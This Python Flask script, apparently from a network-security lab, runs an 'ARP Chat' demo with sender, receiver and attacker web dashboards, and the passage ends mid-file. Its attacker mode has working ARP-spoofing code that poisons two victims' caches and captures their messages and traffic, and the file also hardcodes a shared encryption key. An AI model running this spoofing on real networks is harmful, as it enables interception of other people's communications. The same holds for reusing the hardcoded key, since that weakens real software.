#!/usr/bin/env python3
r"""
Web-based ARP Chat Interface

Provides a web UI for sending and receiving ARP chat messages.
Runs a Flask server with a chat-like interface.

Usage:
    Sender:   python scripts/web_chat.py -i <interface> -t <target_ip> --mode sender
    Receiver: python scripts/web_chat.py -i <interface> --mode receiver
    Attacker: python scripts/web_chat.py -i <interface> -v <victim1_ip> -g <victim2_ip> --mode attacker
    
    Defender (separate script - run as Administrator for protection):
        python scripts/3_defender.py -i <interface>
        python scripts/3_defender.py -i <interface> --protect <ip> --mac <real_mac>
    
Examples (Windows):
    python scripts/web_chat.py -i "\Device\NPF_{GUID}" --mode receiver
    python scripts/web_chat.py -i "\Device\NPF_{GUID}" -t 172.20.10.20 --mode sender
    python scripts/web_chat.py -i "\Device\NPF_{GUID}" -v 172.20.10.10 -g 172.20.10.20 --mode attacker
    
    # Defender (run in separate terminal, requires Administrator for static ARP)
    python scripts/3_defender.py -i "\Device\NPF_{GUID}" --protect 192.168.1.6 --mac 0a:1b:47:97:bf:b2
"""

import sys
import argparse
import threading
import json
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from queue import Queue

sys.path.insert(0, '.')

try:
    from scapy.all import Ether, Raw, sendp, sniff, get_if_hwaddr, ARP
    SCAPY_AVAILABLE = True
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

try:
    from flask import Flask
except ImportError:
    print("ERROR: Flask not installed. Run: pip install flask")
    sys.exit(1)

from core.network_utils import get_interface_info, resolve_mac

# Simple encryption using Fernet (symmetric encryption)
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("WARNING: cryptography not installed. Encryption disabled. Run: pip install cryptography")

# Shared encryption key (in real scenario, this would be exchanged securely)
ENCRYPTION_KEY = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='  # Base64 encoded key

def encrypt_message(message: str) -> str:
    """Encrypt a message using Fernet symmetric encryption."""
    if not CRYPTO_AVAILABLE:
        return message
    try:
        f = Fernet(ENCRYPTION_KEY)
        encrypted = f.encrypt(message.encode())
        return encrypted.decode()
    except Exception as e:
        print(f"Encryption error: {e}")
        return message

def decrypt_message(encrypted_message: str) -> str:
    """Decrypt a message using Fernet symmetric encryption."""
    if not CRYPTO_AVAILABLE:
        return encrypted_message
    try:
        f = Fernet(ENCRYPTION_KEY)
        decrypted = f.decrypt(encrypted_message.encode())
        return decrypted.decode()
    except Exception as e:
        # Return original if decryption fails (message wasn't encrypted)
        return encrypted_message

app = Flask(__name__)

# Global state
chat_state = {
    'mode': 'receiver',
    'interface': None,
    'target_ip': None,
    'target_mac': None,
    'our_ip': '0.0.0.0',
    'our_mac': '00:00:00:00:00:00',
    'messages': [],
    'message_queue': Queue(),
    # Encryption
    'encryption_enabled': False,
    # Attacker mode specific
    'victim1_ip': None,
    'victim1_mac': None,
    'victim2_ip': None,
    'victim2_mac': None,
    'intercepted_packets': [],
    'attack_active': False,
    'packets_intercepted': 0,
    'arp_spoofs_sent': 0
}

ETHER_TYPE = 0x88b5  # Experimental EtherType for ARP Chat

# Attacker Dashboard HTML Template
ATTACKER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👹 ARP Attack Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .matrix-bg {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(180deg, rgba(0,0,0,0.95) 0%, rgba(0,20,0,0.95) 100%);
            z-index: -1;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 20px;
        }
        .header h1 {
            font-size: 2.5rem;
            text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00; }
            to { text-shadow: 0 0 30px #00ff00, 0 0 60px #00ff00, 0 0 80px #00ff00; }
        }
        .header .subtitle {
            color: #ff0000;
            margin-top: 10px;
            font-size: 1.1rem;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
        }
        .stat-card .value {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff00;
        }
        .stat-card .label {
            color: #888;
            margin-top: 5px;
            font-size: 0.85rem;
        }
        .stat-card.danger { border-color: #ff0000; }
        .stat-card.danger .value { color: #ff0000; }
        .stat-card.encrypted { border-color: #9C27B0; }
        .stat-card.encrypted .value { color: #9C27B0; }
        .control-panel {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .control-panel h2 {
            margin-bottom: 10px;
            color: #00ff00;
            font-size: 1.1rem;
        }
        .btn {
            padding: 12px 25px;
            font-size: 1rem;
            font-family: 'Courier New', monospace;
            border: 2px solid;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            margin-right: 10px;
        }
        .btn-attack {
            background: transparent;
            border-color: #ff0000;
            color: #ff0000;
        }
        .btn-attack:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }
        .btn-attack.active {
            background: #ff0000;
            color: #000;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px #ff0000; }
            50% { box-shadow: 0 0 40px #ff0000, 0 0 60px #ff0000; }
        }
        .btn-stop {
            background: transparent;
            border-color: #ffff00;
            color: #ffff00;
        }
        .btn-stop:hover {
            background: #ffff00;
            color: #000;
        }
        .victims-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 15px;
        }
        .victim-card {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 10px 20px;
            text-align: center;
        }
        .victim-card h3 { color: #ff0000; margin-bottom: 5px; font-size: 0.9rem; }
        .victim-card .ip { font-size: 1rem; color: #fff; }
        .victim-card .mac { font-size: 0.7rem; color: #888; }
        .arrow {
            font-size: 1.5rem;
            color: #ff0000;
            animation: arrowPulse 1s infinite;
        }
        @keyframes arrowPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Two-column layout for intercepted traffic */
        .intercepted-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .intercepted-section {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
        }
        .intercepted-section.messages {
            border-color: #ff0000;
        }
        .intercepted-section h2 {
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1rem;
        }
        .intercepted-section h2 .live {
            background: #ff0000;
            color: #fff;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 0.65rem;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .packets-list {
            max-height: 450px;
            overflow-y: auto;
        }
        .packet {
            background: rgba(0, 255, 0, 0.05);
            border-left: 3px solid #00ff00;
            padding: 10px;
            margin-bottom: 8px;
            border-radius: 0 5px 5px 0;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .packet.plaintext {
            border-left-color: #ff0000;
            background: rgba(255, 0, 0, 0.1);
        }
        .packet.encrypted {
            border-left-color: #9C27B0;
            background: rgba(156, 39, 176, 0.1);
        }
        .packet .pkt-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }
        .packet .time { color: #888; font-size: 0.8rem; }
        .packet .type { 
            background: #00ff00;
            color: #000;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 0.7rem;
        }
        .packet.plaintext .type { background: #ff0000; }
        .packet.encrypted .type { background: #9C27B0; }
        .packet .content {
            color: #fff;
            word-break: break-all;
            font-size: 0.9rem;
        }
        .packet.encrypted .content {
            font-family: monospace;
            color: #9C27B0;
            font-size: 0.8rem;
        }
        .packet .meta {
            color: #666;
            font-size: 0.75rem;
            margin-top: 5px;
        }
        .no-packets {
            text-align: center;
            color: #666;
            padding: 40px 20px;
        }
        .terminal-cursor::after {
            content: '█';
            animation: blink 1s infinite;
        }
        
        /* Message-specific styles */
        .message-item {
            background: rgba(255, 0, 0, 0.05);
            border-left: 3px solid #ff0000;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 0 5px 5px 0;
            animation: slideIn 0.3s ease;
        }
        .message-item.encrypted {
            border-left-color: #9C27B0;
            background: rgba(156, 39, 176, 0.1);
        }
        .message-item .msg-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .message-item .sender {
            color: #ff0000;
            font-weight: bold;
        }
        .message-item.encrypted .sender {
            color: #9C27B0;
        }
        .message-item .msg-time {
            color: #666;
            font-size: 0.8rem;
        }
        .message-item .msg-content {
            color: #fff;
            font-size: 1rem;
            padding: 8px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            word-break: break-all;
        }
        .message-item.encrypted .msg-content {
            color: #9C27B0;
            font-size: 0.85rem;
            font-family: monospace;
        }
        .message-item .status-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 10px;
            font-size: 0.7rem;
            margin-top: 8px;
        }
        .message-item .status-badge.vulnerable {
            background: #ff0000;
            color: #fff;
        }
        .message-item .status-badge.protected {
            background: #9C27B0;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="header">
            <h1>👹 ARP ATTACK DASHBOARD</h1>
            <div class="subtitle">Man-in-the-Middle Attack Console</div>
        </div>

        <div class="stats-grid">
            <div class="stat-card danger">
                <div class="value" id="plaintext-count">0</div>
                <div class="label">⚠️ Plaintext (EXPOSED)</div>
            </div>
            <div class="stat-card encrypted">
                <div class="value" id="encrypted-count">0</div>
                <div class="label">🔒 Encrypted (PROTECTED)</div>
            </div>
            <div class="stat-card">
                <div class="value" id="arp-spoofs">0</div>
                <div class="label">ARP Spoofs Sent</div>
            </div>
            <div class="stat-card">
                <div class="value" id="attack-status">READY</div>
                <div class="label">Attack Status</div>
            </div>
        </div>

        <div class="control-panel">
            <h2>🎯 Target Configuration</h2>
            <div class="victims-info">
                <div class="victim-card">
                    <h3>VICTIM 1</h3>
                    <div class="ip">{{ victim1_ip }}</div>
                    <div class="mac">{{ victim1_mac }}</div>
                </div>
                <div class="arrow">⟷ YOU ⟷</div>
                <div class="victim-card">
                    <h3>VICTIM 2</h3>
                    <div class="ip">{{ victim2_ip }}</div>
                    <div class="mac">{{ victim2_mac }}</div>
                </div>
            </div>
            <button class="btn btn-attack" id="attack-btn" onclick="toggleAttack()">
                🚀 START ATTACK
            </button>
            <button class="btn btn-stop" onclick="clearPackets()">
                🗑️ CLEAR LOG
            </button>
        </div>

        <div class="intercepted-grid">
            <!-- Left Column: Intercepted Chat Messages -->
            <div class="intercepted-section messages">
                <h2>💬 Intercepted Messages <span class="live">LIVE</span></h2>
                <div class="packets-list" id="messages-list">
                    <div class="no-packets" id="no-messages">
                        <p>No chat messages intercepted yet...<span class="terminal-cursor"></span></p>
                    </div>
                </div>
            </div>
            
            <!-- Right Column: All Network Packets -->
            <div class="intercepted-section">
                <h2>📡 Network Traffic <span class="live">LIVE</span></h2>
                <div class="packets-list" id="packets-list">
                    <div class="no-packets" id="no-packets">
                        <p>Waiting for traffic...<span class="terminal-cursor"></span></p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let attackActive = false;
        let packets = [];
        let messages = [];

        function toggleAttack() {
            fetch('/attack/toggle', { method: 'POST' })
            .then(res => res.json())
            .then(data => {
                attackActive = data.active;
                updateAttackButton();
            });
        }

        function updateAttackButton() {
            const btn = document.getElementById('attack-btn');
            const status = document.getElementById('attack-status');
            if (attackActive) {
                btn.textContent = '⏹️ STOP ATTACK';
                btn.classList.add('active');
                status.textContent = 'ACTIVE';
                status.style.color = '#ff0000';
            } else {
                btn.textContent = '🚀 START ATTACK';
                btn.classList.remove('active');
                status.textContent = 'STOPPED';
                status.style.color = '#ffff00';
            }
        }

        function clearPackets() {
            fetch('/attack/clear', { method: 'POST' })
            .then(() => {
                packets = [];
                messages = [];
                document.getElementById('packets-list').innerHTML = 
                    '<div class="no-packets" id="no-packets"><p>Waiting for traffic...<span class="terminal-cursor"></span></p></div>';
                document.getElementById('messages-list').innerHTML = 
                    '<div class="no-packets" id="no-messages"><p>No chat messages intercepted yet...<span class="terminal-cursor"></span></p></div>';
            });
        }

        function addMessage(msg) {
            const container = document.getElementById('messages-list');
            const noMessages = document.getElementById('no-messages');
            if (noMessages) noMessages.remove();

            const div = document.createElement('div');
            div.className = 'message-item' + (msg.encrypted ? ' encrypted' : '');
            
            const statusClass = msg.encrypted ? 'protected' : 'vulnerable';
            const statusText = msg.encrypted ? '🔒 PROTECTED - Cannot read!' : '⚠️ EXPOSED - Message visible!';
            
            div.innerHTML = `
                <div class="msg-header">
                    <span class="sender">From: ${msg.src_ip}</span>
                    <span class="msg-time">${msg.time}</span>
                </div>
                <div class="msg-content">${escapeHtml(msg.content)}</div>
                <span class="status-badge ${statusClass}">${statusText}</span>
            `;
            container.insertBefore(div, container.firstChild);
        }

        function addPacket(pkt) {
            const container = document.getElementById('packets-list');
            const noPackets = document.getElementById('no-packets');
            if (noPackets) noPackets.remove();

            const div = document.createElement('div');
            let classes = 'packet';
            if (pkt.encrypted) {
                classes += ' encrypted';
            } else if (pkt.is_chat) {
                classes += ' plaintext';
            }
            div.className = classes;
            
            div.innerHTML = `
                <div class="pkt-header">
                    <span class="time">${pkt.time}</span>
                    <span class="type">${pkt.type}</span>
                </div>
                <div class="content">${escapeHtml(pkt.content)}</div>
                <div class="meta">${pkt.src_mac}</div>
            `;
            container.insertBefore(div, container.firstChild);
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function pollStats() {
            fetch('/attack/stats')
            .then(res => res.json())
            .then(data => {
                document.getElementById('plaintext-count').textContent = data.plaintext_count;
                document.getElementById('encrypted-count').textContent = data.encrypted_count;
                document.getElementById('arp-spoofs').textContent = data.arp_spoofs_sent;
                attackActive = data.attack_active;
                updateAttackButton();

                // Add new packets to right column
                data.new_packets.forEach(pkt => {
                    if (!packets.find(p => p.id === pkt.id)) {
                        packets.push(pkt);
                        addPacket(pkt);
                        
                        // If it's a chat message, also add to left column
                        if (pkt.is_chat) {
                            if (!messages.find(m => m.id === pkt.id)) {
                                messages.push(pkt);
                                addMessage(pkt);
                            }
                        }
                    }
                });
            });
        }

        setInterval(pollStats, 500);
    </script>
</body>
</html>
'''

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARP Chat - {{ mode|title }}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .chat-container {
            width: 100%;
            max-width: 600px;
            background: #0f0f23;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            overflow: hidden;
        }
        .chat-header {
            background: linear-gradient(135deg, {% if mode == 'sender' %}#4CAF50, #45a049{% else %}#2196F3, #1976D2{% endif %});
            color: white;
            padding: 20px;
            text-align: center;
        }
        .chat-header h1 {
            font-size: 1.5rem;
            margin-bottom: 5px;
        }
        .chat-header .status {
            font-size: 0.85rem;
            opacity: 0.9;
        }
        .chat-header .info {
            font-size: 0.75rem;
            opacity: 0.7;
            margin-top: 8px;
            font-family: monospace;
        }
        .encryption-toggle {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-bottom: 1px solid #2d2d44;
        }
        .encryption-toggle label {
            color: #888;
            font-size: 0.9rem;
        }
        .toggle-switch {
            position: relative;
            width: 50px;
            height: 26px;
        }
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: #444;
            transition: 0.3s;
            border-radius: 26px;
        }
        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 20px;
            width: 20px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: 0.3s;
            border-radius: 50%;
        }
        .toggle-switch input:checked + .toggle-slider {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            box-shadow: 0 0 10px #4CAF50;
        }
        .toggle-switch input:checked + .toggle-slider:before {
            transform: translateX(24px);
        }
        .encryption-status {
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: bold;
        }
        .encryption-status.on {
            background: #4CAF50;
            color: white;
        }
        .encryption-status.off {
            background: #f44336;
            color: white;
        }
        .chat-messages {
            height: 350px;
            overflow-y: auto;
            padding: 20px;
            background: #1a1a2e;
        }
        .message {
            margin-bottom: 15px;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            text-align: right;
        }
        .message.received {
            text-align: left;
        }
        .message.intercepted {
            text-align: center;
        }
        .message-bubble {
            display: inline-block;
            max-width: 80%;
            padding: 12px 18px;
            border-radius: 18px;
            word-wrap: break-word;
        }
        .message.sent .message-bubble {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            border-bottom-right-radius: 4px;
        }
        .message.received .message-bubble {
            background: #2d2d44;
            color: #e0e0e0;
            border-bottom-left-radius: 4px;
        }
        .message.intercepted .message-bubble {
            background: linear-gradient(135deg, #f44336, #d32f2f);
            color: white;
            font-style: italic;
        }
        .message-info {
            font-size: 0.7rem;
            color: #888;
            margin-top: 4px;
        }
        .message-info .encrypted-badge {
            background: #4CAF50;
            color: white;
            padding: 1px 6px;
            border-radius: 8px;
            font-size: 0.65rem;
            margin-left: 5px;
        }
        .chat-input {
            display: flex;
            padding: 15px;
            background: #0f0f23;
            border-top: 1px solid #2d2d44;
        }
        .chat-input input {
            flex: 1;
            padding: 12px 18px;
            border: none;
            border-radius: 25px;
            background: #1a1a2e;
            color: white;
            font-size: 1rem;
            outline: none;
        }
        .chat-input input:focus {
            box-shadow: 0 0 0 2px {% if mode == 'sender' %}#4CAF50{% else %}#2196F3{% endif %};
        }
        .chat-input input::placeholder {
            color: #666;
        }
        .chat-input button {
            margin-left: 10px;
            padding: 12px 25px;
            border: none;
            border-radius: 25px;
            background: linear-gradient(135deg, {% if mode == 'sender' %}#4CAF50, #45a049{% else %}#2196F3, #1976D2{% endif %});
            color: white;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .chat-input button:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        .chat-input button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .no-messages {
            text-align: center;
            color: #666;
            padding: 50px 20px;
        }
        .no-messages .icon {
            font-size: 3rem;
            margin-bottom: 15px;
        }
        {% if mode == 'receiver' %}
        .chat-input {
            display: none;
        }
        {% endif %}
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="chat-header">
            <h1>🔐 ARP Chat - {{ mode|title }}</h1>
            <div class="status">
                {% if mode == 'sender' %}
                    Sending to: {{ target_ip }}
                {% else %}
                    Listening for messages...
                {% endif %}
            </div>
            <div class="info">
                Your IP: {{ our_ip }} | MAC: {{ our_mac }}
            </div>
        </div>
        
        {% if mode == 'sender' %}
        <div class="encryption-toggle">
            <label>🔓 Unencrypted</label>
            <label class="toggle-switch">
                <input type="checkbox" id="encryption-toggle" onchange="toggleEncryption()">
                <span class="toggle-slider"></span>
            </label>
            <label>🔒 Encrypted</label>
            <span class="encryption-status off" id="encryption-status">OFF</span>
        </div>
        {% endif %}
        
        <div class="chat-messages" id="messages">
            <div class="no-messages" id="no-messages">
                <div class="icon">💬</div>
                <p>{% if mode == 'sender' %}Type a message below to send{% else %}Waiting for incoming messages...{% endif %}</p>
            </div>
        </div>
        
        <div class="chat-input">
            <input type="text" id="message-input" placeholder="Type your message..." autocomplete="off">
            <button id="send-btn" onclick="sendMessage()">Send</button>
        </div>
    </div>

    <script>
        const mode = "{{ mode }}";
        let messages = [];
        let encryptionEnabled = false;

        function toggleEncryption() {
            const checkbox = document.getElementById('encryption-toggle');
            encryptionEnabled = checkbox.checked;
            const status = document.getElementById('encryption-status');
            if (encryptionEnabled) {
                status.textContent = 'ON';
                status.className = 'encryption-status on';
            } else {
                status.textContent = 'OFF';
                status.className = 'encryption-status off';
            }
            
            // Notify server
            fetch('/encryption/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ enabled: encryptionEnabled })
            });
        }

        function addMessage(msg) {
            const container = document.getElementById('messages');
            const noMessages = document.getElementById('no-messages');
            if (noMessages) noMessages.style.display = 'none';

            const div = document.createElement('div');
            div.className = 'message ' + msg.type;
            
            let senderInfo = '';
            if (msg.sender_ip) {
                senderInfo = msg.type === 'sent' ? 'You' : msg.sender_ip;
            }
            
            const encryptedBadge = msg.encrypted ? '<span class="encrypted-badge">🔒 ENCRYPTED</span>' : '';
            
            div.innerHTML = `
                <div class="message-bubble">${escapeHtml(msg.text)}</div>
                <div class="message-info">${msg.time} ${senderInfo ? '• ' + senderInfo : ''} ${encryptedBadge}</div>
            `;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function sendMessage() {
            const input = document.getElementById('message-input');
            const text = input.value.trim();
            if (!text) return;

            fetch('/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: text, encrypted: encryptionEnabled })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    addMessage({
                        type: 'sent',
                        text: text,
                        time: new Date().toLocaleTimeString(),
                        encrypted: encryptionEnabled
                    });
                    input.value = '';
                } else {
                    alert('Failed to send: ' + data.error);
                }
            })
            .catch(err => alert('Error: ' + err));
        }

        function pollMessages() {
            fetch('/messages')
            .then(res => res.json())
            .then(data => {
                data.messages.forEach(msg => {
                    if (!messages.find(m => m.id === msg.id)) {
                        messages.push(msg);
                        addMessage(msg);
                    }
                });
            })
            .catch(err => console.error('Poll error:', err));
        }

        // Enter key to send
        document.getElementById('message-input')?.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendMessage();
        });

        // Poll for new messages every 500ms
        setInterval(pollMessages, 500);
    </script>
</body>
</html>
'''


@app.route('/')
def index():
    if chat_state['mode'] == 'attacker':
        return render_template_string(
            ATTACKER_TEMPLATE,
            victim1_ip=chat_state['victim1_ip'] or 'N/A',
            victim1_mac=chat_state['victim1_mac'] or 'N/A',
            victim2_ip=chat_state['victim2_ip'] or 'N/A',
            victim2_mac=chat_state['victim2_mac'] or 'N/A'
        )
    return render_template_string(
        HTML_TEMPLATE,
        mode=chat_state['mode'],
        target_ip=chat_state['target_ip'] or 'N/A',
        our_ip=chat_state['our_ip'],
        our_mac=chat_state['our_mac']
    )


@app.route('/send', methods=['POST'])
def send_message():
    if chat_state['mode'] != 'sender':
        return jsonify({'success': False, 'error': 'Not in sender mode'})
    
    data = request.get_json()
    message = data.get('message', '').strip()
    use_encryption = data.get('encrypted', False)
    
    if not message:
        return jsonify({'success': False, 'error': 'Empty message'})
    
    try:
        # Encrypt message if encryption is enabled
        if use_encryption and CRYPTO_AVAILABLE:
            encrypted_msg = encrypt_message(message)
            # Mark as encrypted with prefix
            payload = f"ARPCHAT_ENC|{chat_state['our_ip']}|{encrypted_msg}"
        else:
            payload = f"ARPCHAT|{chat_state['our_ip']}|{message}"
        
        packet = Ether(
            src=chat_state['our_mac'],
            dst=chat_state['target_mac'],
            type=ETHER_TYPE
        ) / Raw(load=payload.encode())
        
        sendp(packet, iface=chat_state['interface'], verbose=False)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/encryption/toggle', methods=['POST'])
def toggle_encryption():
    data = request.get_json()
    chat_state['encryption_enabled'] = data.get('enabled', False)
    return jsonify({'success': True, 'enabled': chat_state['encryption_enabled']})


@app.route('/messages')
def get_messages():
    return jsonify({'messages': chat_state['messages']})


# ============ ATTACKER MODE ROUTES ============

@app.route('/attack/toggle', methods=['POST'])
def toggle_attack():
    chat_state['attack_active'] = not chat_state['attack_active']
    if chat_state['attack_active']:
        # Start ARP spoofing thread
        spoof_thread = threading.Thread(target=arp_spoof_loop, daemon=True)
        spoof_thread.start()
    return jsonify({'active': chat_state['attack_active']})


@app.route('/attack/clear', methods=['POST'])
def clear_attack_log():
    chat_state['intercepted_packets'] = []
    chat_state['packets_intercepted'] = 0
    return jsonify({'success': True})


@app.route('/attack/stats')
def get_attack_stats():
    messages_captured = sum(1 for p in chat_state['intercepted_packets'] if p.get('is_chat'))
    plaintext_count = sum(1 for p in chat_state['intercepted_packets'] if p.get('is_chat') and not p.get('encrypted'))
    encrypted_count = sum(1 for p in chat_state['intercepted_packets'] if p.get('is_chat') and p.get('encrypted'))
    return jsonify({
        'packets_intercepted': chat_state['packets_intercepted'],
        'arp_spoofs_sent': chat_state['arp_spoofs_sent'],
        'messages_captured': messages_captured,
        'plaintext_count': plaintext_count,
        'encrypted_count': encrypted_count,
        'attack_active': chat_state['attack_active'],
        'new_packets': chat_state['intercepted_packets'][-50:]  # Last 50 packets
    })


def arp_spoof_loop():
    """Continuously send ARP spoofs to both victims."""
    print("[ATTACK] Starting ARP spoof loop...")
    while chat_state['attack_active']:
        try:
            # Spoof victim1: tell them we are victim2
            pkt1 = Ether(dst=chat_state['victim1_mac']) / ARP(
                op=2,  # is-at (reply)
                psrc=chat_state['victim2_ip'],
                pdst=chat_state['victim1_ip'],
                hwdst=chat_state['victim1_mac']
            )
            sendp(pkt1, iface=chat_state['interface'], verbose=False)
            
            # Spoof victim2: tell them we are victim1
            pkt2 = Ether(dst=chat_state['victim2_mac']) / ARP(
                op=2,
                psrc=chat_state['victim1_ip'],
                pdst=chat_state['victim2_ip'],
                hwdst=chat_state['victim2_mac']
            )
            sendp(pkt2, iface=chat_state['interface'], verbose=False)
            
            chat_state['arp_spoofs_sent'] += 2
            
            import time
            time.sleep(2)
        except Exception as e:
            print(f"[ATTACK] Spoof error: {e}")
            break
    print("[ATTACK] Spoof loop stopped.")


def attacker_packet_handler(packet):
    """Handle packets in attacker mode - capture everything."""
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Check for ARP Chat messages
        if packet.haslayer(Ether) and packet[Ether].type == ETHER_TYPE:
            if packet.haslayer(Raw):
                data = packet[Raw].load.decode()
                
                # Check for encrypted messages
                if data.startswith("ARPCHAT_ENC|"):
                    parts = data.split("|", 2)
                    if len(parts) >= 3:
                        # Show the encrypted gibberish - attacker cannot read it!
                        pkt_info = {
                            'id': len(chat_state['intercepted_packets']) + 1,
                            'time': timestamp,
                            'type': '🔒 ENCRYPTED MSG',
                            'content': f"[{parts[1]}]: {parts[2][:50]}..." if len(parts[2]) > 50 else f"[{parts[1]}]: {parts[2]}",
                            'src_ip': parts[1],
                            'dst_ip': 'broadcast',
                            'src_mac': packet[Ether].src,
                            'is_chat': True,
                            'encrypted': True
                        }
                        chat_state['intercepted_packets'].append(pkt_info)
                        chat_state['packets_intercepted'] += 1
                        print(f"[INTERCEPTED] Encrypted: {parts[1]} -> [CANNOT DECRYPT]")
                
                elif data.startswith("ARPCHAT|"):
                    parts = data.split("|", 2)
                    if len(parts) >= 3:
                        pkt_info = {
                            'id': len(chat_state['intercepted_packets']) + 1,
                            'time': timestamp,
                            'type': '💬 PLAINTEXT MSG',
                            'content': f"[{parts[1]}]: {parts[2]}",
                            'src_ip': parts[1],
                            'dst_ip': 'broadcast',
                            'src_mac': packet[Ether].src,
                            'is_chat': True,
                            'encrypted': False
                        }
                        chat_state['intercepted_packets'].append(pkt_info)
                        chat_state['packets_intercepted'] += 1
                        print(f"[INTERCEPTED] Plaintext: {parts[1]} -> {parts[2]}")
        
        # Also capture regular traffic between victims
        elif packet.haslayer(Ether):
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            
            # Only log traffic between our victims
            if src_mac in [chat_state['victim1_mac'], chat_state['victim2_mac']]:
                pkt_info = {
                    'id': len(chat_state['intercepted_packets']) + 1,
                    'time': timestamp,
                    'type': 'PACKET',
                    'content': f"EtherType: {hex(packet[Ether].type)} | Size: {len(packet)} bytes",
                    'src_ip': 'N/A',
                    'dst_ip': 'N/A',
                    'src_mac': src_mac,
                    'is_chat': False
                }
                chat_state['intercepted_packets'].append(pkt_info)
                chat_state['packets_intercepted'] += 1
                
    except Exception as e:
        pass


def packet_handler(packet):
    """Handle incoming ARP chat packets."""
